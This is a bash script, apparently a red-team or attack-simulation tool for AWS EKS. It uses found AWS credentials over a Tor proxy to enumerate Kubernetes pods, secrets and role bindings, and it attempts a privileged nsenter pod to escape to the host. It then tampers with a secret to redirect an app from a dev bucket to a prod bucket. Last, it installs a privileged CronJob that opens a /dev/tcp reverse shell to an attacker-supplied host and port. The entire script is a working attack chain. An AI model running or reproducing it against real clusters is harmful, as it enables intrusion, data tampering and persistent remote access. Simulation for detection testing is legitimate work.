#!/bin/bash

SCRIPTNAME=scan2kubeshell
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

help(){
cat <<EOH
usage: $SCRIPTNAME [-h] [--reverse-shell-host=REVERSE_SHELL_HOST] [--reverse-shell-port=REVERSE_SHELL_PORT]

-h                      print this message and exit
--reverse-shell-host    the reverse shell host or ip
--reverse-shell-port    the reverse shell port
EOH
    exit 1
}

for i in "$@"; do
  case $i in
    -h|--help)
        HELP="$${i#*=}"
        shift # past argument=value
        help
        ;;
    -h=*|--reverse-shell-host=*)
        REVERSE_SHELL_HOST="$${i#*=}"
        shift # past argument=value
        ;;
    -p=*|--reverse-shell-port=*)
        REVERSE_SHELL_PORT="$${i#*=}"
        shift # past argument=value
        ;;
    *)
      # unknown option
      ;;
  esac
done

if [ -z $REVERSE_SHELL_HOST ] || [ -z $REVERSE_SHELL_PORT ]; then
  log "required args --reverse-shell-host or --reverse-shell-port missing"
  exit 1
fi

cat <<EOF >> $LOGFILE
REVERSE_SHELL_HOST=$REVERSE_SHELL_HOST
REVERSE_SHELL_PORT=$REVERSE_SHELL_PORT
EOF

#######################
# kube cred setup
#######################

KUBECTL_PATH=$(command -v kubectl)

# required for kubectl call tunneling
function kubectl() {
    HTTPS_PROXY="socks5://torproxy:9050" \
    ALL_PROXY="socks5://torproxy:9050" \
    HTTP_PROXY="socks5://torproxy:9050" \
    $KUBECTL_PATH "$@"
}

log "public ip: $(curl -s https://icanhazip.com)"

if ! command -v jq; then
  while ! curl -LJ -o /usr/local/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64; do
    log "failed to download jq - retrying..."
    sleep 30
  done
  chmod 755 /usr/local/bin/jq
fi

while ! [ -f ~/.aws/config ] || ! [ -f ~/.aws/credentials ]; do
    log "missing aws config: ~/.aws/config || ~/.aws/credentials"
    log "aws dir listing: $(ls -ltra ~/.aws)"
    log "waiting for aws config and credentials..."
    sleep 60
done
log "available profiles: $(aws configure list-profiles)"

while ! [ -f ~/.kube/config ]; do
    log "missing kube config: ~/.kube/config"
    log "kube dir listing: $(ls -ltra ~/.kube)"
    log "attempting to request kube config with current credentials..."
    aws eks update-kubeconfig --name="$(aws eks list-clusters --output text | head -1 | cut -f2)" | tee -a $LOGFILE
    ERR=$?
    log "result: $ERR"
    if [ $ERR -eq 0 ]; then
      log "kube credential request successful..."
    else 
      log "waiting for kube config..."
    fi
    sleep 60
done

# update kubeconfig regardless
aws eks update-kubeconfig --name="$(aws eks list-clusters --output text | head -1 | cut -f2)"
log "available clusters: $(kubectl config get-clusters)"

export AWS_PAGER=""
PROFILE=default
log "Running: aws sts get-caller-identity --profile=$PROFILE"
aws sts get-caller-identity --profile=$PROFILE $opts >> $LOGFILE 2>&1

log "Getting current account number..."
AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
log "Account Number: $AWS_ACCOUNT_NUMBER"

log "starting get enumeration..."
entities=("pods" "namespaces" "cronjobs" "secrets" "configmaps" "deployments" "services" "roles" "clusterroles" "rolebindings" "clusterrolebindings")
read_actions=("get" "list" "describe")
for action in "$${read_actions[@]}"; do
    for entity in "$${entities[@]}"; do
      log "Running: kubectl $action $entity -A"
      kubectl $action $entity -A 2>&1 | tee -a $LOGFILE
    done
done

# denied exec
log "starting denied exec..."
RESULT=$(kubectl exec -it deployment/authapp -n authapp -- /bin/sh -c "echo helloworld") 
echo $RESULT 2>&1 | tee -a $LOGFILE

# denied kubectl root
log "starting denied run r00t..."
RESULT=$(kubectl run r00t -it --rm \
  --restart=Never \
  --image nah r00t \
  --overrides '{"spec":{"hostPID": true, "containers":[{"name":"x","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}' "$@")
echo $RESULT 2>&1 | tee -a $LOGFILE

# denied access
log "starting denied get secret..."
kubectl get secret sh.helm.release.v1.reloader.v1 -n authapp -o json 2>&1 | tee -a $LOGFILE

# read only secret
log "starting success get secret read-only..."
kubectl get secret authapp-env-vars -n authapp -o json 2>&1 | tee -a $LOGFILE

# edit access
log "starting success get secret read/write..."
kubectl get secret s3app-env-vars -n s3app -o json 2>&1 | tee -a $LOGFILE

log "getting bucket value..."
BUCKET_NAME=$(kubectl get secret s3app-env-vars -n s3app -o json | jq -r '.data.BUCKET_NAME')
log "bucket name: $(echo -n $BUCKET_NAME | base64 -d)"
NEW_BUCKET_NAME=$(echo -n $BUCKET_NAME | base64 -d | sed 's/-dev-/-prod-/g' | base64)
log "new bucket name: $(echo -n $NEW_BUCKET_NAME | base64 -d)"

# update secret to point to prod bucket
log "updating secret with new bucket name..."
kubectl get secret s3app-env-vars -n s3app -o json | sed "s/$BUCKET_NAME/$NEW_BUCKET_NAME/g" > /tmp/kubernetes_prod_bucket.json
kubectl apply -f /tmp/kubernetes_prod_bucket.json

# we should probably curl the admin interface with our token here but this might be enough for now
log "waiting for pod restart..."
sleep 30

# next stage is using the attached service account to start a cronjob reverse shell in the cluster
log "getting s3 service account..."
SERVICE_ACCOUNT=$(kubectl get deployment -n s3app s3app -o json | jq -r '.spec.template.spec.serviceAccount')
log "service account: $SERVICE_ACCOUNT"

# now we setup a cronjob to create a pod running the service account
log "creating cronjob file..."
# Delete the existing CronJob if it exists
kubectl delete cronjob reverse-shell-cronjob --namespace=s3app --ignore-not-found 2>&1 | tee -a $LOGFILE

# now we setup a cronjob to create a pod running the service account
log "creating cronjob file..."
cat <<EOF > /tmp/kubernetes_prod_cronjob.yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  namespace: s3app
  name: reverse-shell-cronjob
spec:
  schedule: "15 */1 * * *"
  concurrencyPolicy: Forbid
  jobTemplate:
    spec:
      activeDeadlineSeconds: 3600
      ttlSecondsAfterFinished: 120
      template:
        spec:
          serviceAccountName: $SERVICE_ACCOUNT
          containers:
          - name: ubuntu
            image: ubuntu
            env:
            - name: BUCKET_NAME
              value: "$(echo -n $NEW_BUCKET_NAME | base64 -d)"
            - name: REVERSE_SHELL_HOST
              value: "$REVERSE_SHELL_HOST"
            - name: REVERSE_SHELL_PORT
              value: "$REVERSE_SHELL_PORT"
            command: ["/bin/bash", "-c", "apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1"]
            securityContext:
              privileged: true
          restartPolicy: OnFailure
EOF


cat /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE

log "starting cronjob..."
kubectl apply -f /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE

log "done."